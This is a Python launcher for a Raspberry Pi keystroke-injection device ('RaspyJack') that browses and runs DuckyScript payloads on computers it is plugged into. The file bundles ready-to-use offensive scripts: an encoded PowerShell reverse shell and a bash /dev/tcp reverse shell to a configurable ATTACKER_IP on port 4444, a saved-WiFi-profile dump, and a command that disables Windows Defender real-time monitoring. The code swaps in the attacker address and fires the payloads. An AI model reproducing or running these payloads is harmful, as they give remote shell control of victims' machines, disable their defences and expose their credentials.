#!/usr/bin/env python3
"""
RaspyJack Payload -- DuckyScript Library & Launcher
=====================================================
Author: 7h30th3r0n3

Browse, preview, and execute DuckyScript payloads stored in
/root/Raspyjack/payloads/hid_scripts/. Bundles a set of common
offensive scripts and allows editing the ATTACKER_IP placeholder.

Setup / Prerequisites:
  - Script files in /root/Raspyjack/payloads/hid_scripts/.
  - Edit ATTACKER_IP placeholder in scripts before use.
  - Requires hid_injector.py gadget setup.

Controls:
  UP / DOWN  -- Scroll script list
  OK         -- Preview selected, then execute
  RIGHT      -- Execute directly (no preview)
  KEY1       -- Refresh script list
  KEY2       -- Edit ATTACKER_IP placeholder
  KEY3       -- Exit
"""

import os
import sys
import time
import subprocess
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SCRIPTS_DIR = "/root/Raspyjack/payloads/hid_scripts"
HID_INJECTOR = "/root/Raspyjack/payloads/usb/hid_injector.py"
ROWS_VISIBLE = 7
IP_PLACEHOLDER = "ATTACKER_IP"

os.makedirs(SCRIPTS_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Bundled scripts (created if missing)
# ---------------------------------------------------------------------------
BUNDLED_SCRIPTS = {
    "reverse_shell_windows.txt": (
        "REM Reverse shell via PowerShell (Windows)\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell -e "
        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AH"
        "MAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBl"
        "AG4AdAAoACIAQQBUAFQAQQBDAEsARQBSAF8ASQBQACIALAA0ADQANAA0ACkA\n"
        "ENTER\n"
    ),
    "reverse_shell_linux.txt": (
        "REM Reverse shell via bash (Linux)\n"
        "CTRL ALT t\n"
        "DELAY 500\n"
        "STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
        "ENTER\n"
    ),
    "exfil_wifi_windows.txt": (
        "REM Exfiltrate saved WiFi profiles (Windows)\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING cmd /c \"netsh wlan show profiles\" > %TEMP%\\w.txt\n"
        "ENTER\n"
    ),
    "disable_defender.txt": (
        "REM Disable Windows Defender real-time monitoring\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell Set-MpPreference "
        "-DisableRealtimeMonitoring $true\n"
        "ENTER\n"
    ),
    "rickroll.txt": (
        "REM Open Rick Astley - educational purposes\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
        "ENTER\n"
    ),
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
scripts = []            # list of filenames
scroll_pos = 0
status_msg = "Idle"
executing = False
exec_progress = ""
view_mode = "list"      # "list", "preview", "ip_edit"
preview_lines = []
preview_scroll = 0
attacker_ip = "10.0.0.1"

# Characters available for IP editing
IP_CHARS = list("0123456789.")
ip_edit_buf = []
ip_cursor = 0


# ---------------------------------------------------------------------------
# Script management
# ---------------------------------------------------------------------------

def _ensure_bundled():
    """Create bundled scripts if they do not exist."""
    for fname, content in BUNDLED_SCRIPTS.items():
        path = os.path.join(SCRIPTS_DIR, fname)
        if not os.path.isfile(path):
            with open(path, "w") as f:
                f.write(content)


def _scan_scripts():
    """List available DuckyScript files."""
    found = []
    if os.path.isdir(SCRIPTS_DIR):
        for fname in sorted(os.listdir(SCRIPTS_DIR)):
            if fname.endswith((".txt", ".ducky", ".ds")):
                found.append(fname)
    return found


def _read_script(fname):
    """Read script content, return list of lines."""
    path = os.path.join(SCRIPTS_DIR, fname)
    try:
        with open(path, "r") as f:
            return f.readlines()
    except Exception:
        return ["(Error reading file)"]


def _first_line(fname):
    """Return first non-comment line of a script for preview."""
    path = os.path.join(SCRIPTS_DIR, fname)
    try:
        with open(path, "r") as f:
            for raw in f:
                stripped = raw.strip()
                if stripped and not stripped.startswith("REM"):
                    return stripped[:20]
        return "(empty)"
    except Exception:
        return "(err)"


def _replace_ip_in_script(fname):
    """Replace ATTACKER_IP placeholder with current IP, return temp path."""
    path = os.path.join(SCRIPTS_DIR, fname)
    try:
        with open(path, "r") as f:
            content = f.read()
    except Exception:
        return path

    with lock:
        ip = attacker_ip

    if IP_PLACEHOLDER not in content:
        return path

    replaced = content.replace(IP_PLACEHOLDER, ip)
    tmp_path = os.path.join(
        SCRIPTS_DIR,
        f".tmp_{os.path.basename(fname)}",
    )
    with open(tmp_path, "w") as f:
        f.write(replaced)
    return tmp_path


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

def _execute_script(fname):
    """Execute a DuckyScript via hid_injector subprocess."""
    global executing, exec_progress, status_msg

    with lock:
        executing = True
        exec_progress = "Preparing..."
        status_msg = f"Exec: {fname[:16]}"

    script_path = _replace_ip_in_script(fname)

    try:
        with lock:
            exec_progress = "Running..."

        result = subprocess.run(
            ["python3", HID_INJECTOR, script_path],
            capture_output=True, text=True, timeout=120,
        )

        if result.returncode == 0:
            with lock:
                exec_progress = "Done"
                status_msg = f"OK: {fname[:18]}"
        else:
            err = result.stderr.strip()[:30] if result.stderr else "error"
            with lock:
                exec_progress = f"Fail: {err}"
                status_msg = f"Fail: {fname[:14]}"

    except subprocess.TimeoutExpired:
        with lock:
            exec_progress = "Timeout!"
            status_msg = "Execution timeout"
    except Exception as exc:
        with lock:
            exec_progress = f"Err: {str(exc)[:18]}"
            status_msg = f"Err: {str(exc)[:18]}"
    finally:
        # Cleanup temp file
        tmp = os.path.join(SCRIPTS_DIR, f".tmp_{fname}")
        if os.path.isfile(tmp):
            try:
                os.unlink(tmp)
            except OSError:
                pass
        with lock:
            executing = False


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title, color="#00CCFF"):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill=color)
    with lock:
        active = executing
    indicator = "#FFFF00" if active else "#00FF00"
    d.ellipse((118, 3, 122, 7), fill=indicator)


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def _draw_list_view():
    """Render scrollable script list."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "DUCKY LIBRARY")

    with lock:
        sc = scroll_pos
        msg = status_msg
        active = executing
        prog = exec_progress

    if active:
        d.text((2, 18), msg[:22], font=font, fill="#FFAA00")
        d.text((2, 32), prog[:22], font=font, fill="#CCCCCC")
        _draw_footer(d, "Executing...")
    elif not scripts:
        d.text((10, 50), "No scripts found", font=font, fill="#666")
        d.text((10, 64), "K1 to refresh", font=font, fill="#666")
        _draw_footer(d, "K1:Refresh K3:Exit")
    else:
        visible = scripts[sc:sc + ROWS_VISIBLE]
        for i, fname in enumerate(visible):
            y = 16 + i * 14
            is_selected = (i == 0)
            color = "#FFFF00" if is_selected else "#CCCCCC"
            display = fname[:16]
            d.text((2, y), display, font=font, fill=color)
            if is_selected:
                hint = _first_line(fname)
                d.text((2, y + 9), hint, font=font, fill="#666")

        _draw_footer(d, "OK:Prev R:Exec K3:X")

    LCD.LCD_ShowImage(img, 0, 0)


def _draw_preview_view():
    """Render script preview (scrollable)."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "PREVIEW", "#FFAA00")

    with lock:
        lines = list(preview_lines)
        sc = preview_scroll

    visible = lines[sc:sc + 8]
    y = 16
    for line in visible:
        d.text((2, y), line.rstrip()[:22], font=font, fill="#CCCCCC")
        y += 12

    if not visible:
        d.text((10, 50), "(empty script)", font=font, fill="#666")

    _draw_footer(d, "OK:Exec K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_ip_edit_view():
    """Render IP address editor."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "EDIT IP", "#00FF00")

    d.text((2, 20), "Set ATTACKER_IP:", font=font, fill="#888")

    with lock:
        buf = list(ip_edit_buf)
        cur = ip_cursor

    ip_str = "".join(buf)
    d.text((2, 38), ip_str, font=font, fill="#FFFFFF")

    # Cursor indicator
    if buf:
        char_width = 6
        cursor_x = 2 + cur * char_width
        d.line((cursor_x, 48, cursor_x + 5, 48), fill="#FFFF00")

    d.text((2, 60), "UP/DN: change char", font=font, fill="#666")
    d.text((2, 72), "L/R: move cursor", font=font, fill="#666")
    d.text((2, 84), "OK: confirm", font=font, fill="#666")
    d.text((2, 96), "KEY1: add digit", font=font, fill="#666")

    _draw_footer(d, "OK:Save K3:Cancel")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global scripts, scroll_pos, status_msg, view_mode
    global preview_lines, preview_scroll, attacker_ip
    global ip_edit_buf, ip_cursor

    _ensure_bundled()
    scripts = _scan_scripts()

    with lock:
        status_msg = f"Found {len(scripts)} scripts"

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 16), "DUCKY LIBRARY", font=font, fill="#00CCFF")
    d.text((4, 36), "DuckyScript launcher", font=font, fill="#888")
    d.text((4, 48), f"Scripts: {len(scripts)}", font=font, fill="#666")
    d.text((4, 66), "OK=Preview  R=Execute", font=font, fill="#666")
    d.text((4, 78), "K1=Refresh K2=Set IP", font=font, fill="#666")
    d.text((4, 90), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode == "preview":
                    with lock:
                        view_mode = "list"
                    time.sleep(0.2)
                    continue
                if view_mode == "ip_edit":
                    with lock:
                        view_mode = "list"
                    time.sleep(0.2)
                    continue
                break

            # --- IP edit mode ---
            if view_mode == "ip_edit":
                if btn == "UP":
                    with lock:
                        if ip_edit_buf and ip_cursor < len(ip_edit_buf):
                            ch = ip_edit_buf[ip_cursor]
                            idx = IP_CHARS.index(ch) if ch in IP_CHARS else 0
                            new_idx = (idx + 1) % len(IP_CHARS)
                            ip_edit_buf = (
                                ip_edit_buf[:ip_cursor]
                                + [IP_CHARS[new_idx]]
                                + ip_edit_buf[ip_cursor + 1:]
                            )
                    time.sleep(0.15)

                elif btn == "DOWN":
                    with lock:
                        if ip_edit_buf and ip_cursor < len(ip_edit_buf):
                            ch = ip_edit_buf[ip_cursor]
                            idx = IP_CHARS.index(ch) if ch in IP_CHARS else 0
                            new_idx = (idx - 1) % len(IP_CHARS)
                            ip_edit_buf = (
                                ip_edit_buf[:ip_cursor]
                                + [IP_CHARS[new_idx]]
                                + ip_edit_buf[ip_cursor + 1:]
                            )
                    time.sleep(0.15)

                elif btn == "LEFT":
                    with lock:
                        ip_cursor = max(0, ip_cursor - 1)
                    time.sleep(0.15)

                elif btn == "RIGHT":
                    with lock:
                        ip_cursor = min(len(ip_edit_buf) - 1, ip_cursor + 1)
                    time.sleep(0.15)

                elif btn == "KEY1":
                    # Add a digit
                    with lock:
                        if len(ip_edit_buf) < 15:
                            ip_edit_buf = ip_edit_buf + ["0"]
                            ip_cursor = len(ip_edit_buf) - 1
                    time.sleep(0.2)

                elif btn == "OK":
                    with lock:
                        attacker_ip = "".join(ip_edit_buf)
                        status_msg = f"IP: {attacker_ip}"
                        view_mode = "list"
                    time.sleep(0.3)

                _draw_ip_edit_view()
                time.sleep(0.05)
                continue

            # --- Preview mode ---
            if view_mode == "preview":
                if btn == "UP":
                    with lock:
                        preview_scroll = max(0, preview_scroll - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        preview_scroll = min(
                            max(0, len(preview_lines) - 8),
                            preview_scroll + 1,
                        )
                    time.sleep(0.15)
                elif btn == "OK":
                    with lock:
                        active = executing
                    if not active and scripts and scroll_pos < len(scripts):
                        selected = scripts[scroll_pos]
                        threading.Thread(
                            target=_execute_script,
                            args=(selected,),
                            daemon=True,
                        ).start()
                        view_mode = "list"
                    time.sleep(0.3)

                _draw_preview_view()
                time.sleep(0.05)
                continue

            # --- List mode ---
            if btn == "UP":
                with lock:
                    scroll_pos = max(0, scroll_pos - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    scroll_pos = min(
                        max(0, len(scripts) - 1), scroll_pos + 1
                    )
                time.sleep(0.15)

            elif btn == "OK":
                with lock:
                    active = executing
                if not active and scripts and scroll_pos < len(scripts):
                    selected = scripts[scroll_pos]
                    with lock:
                        preview_lines = _read_script(selected)
                        preview_scroll = 0
                        view_mode = "preview"
                time.sleep(0.2)

            elif btn == "RIGHT":
                with lock:
                    active = executing
                if not active and scripts and scroll_pos < len(scripts):
                    selected = scripts[scroll_pos]
                    threading.Thread(
                        target=_execute_script,
                        args=(selected,),
                        daemon=True,
                    ).start()
                time.sleep(0.3)

            elif btn == "KEY1":
                scripts = _scan_scripts()
                with lock:
                    scroll_pos = 0
                    status_msg = f"Found {len(scripts)} scripts"
                time.sleep(0.3)

            elif btn == "KEY2":
                with lock:
                    ip_edit_buf = list(attacker_ip)
                    ip_cursor = 0
                    view_mode = "ip_edit"
                time.sleep(0.2)

            _draw_list_view()
            time.sleep(0.05)

    finally:
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
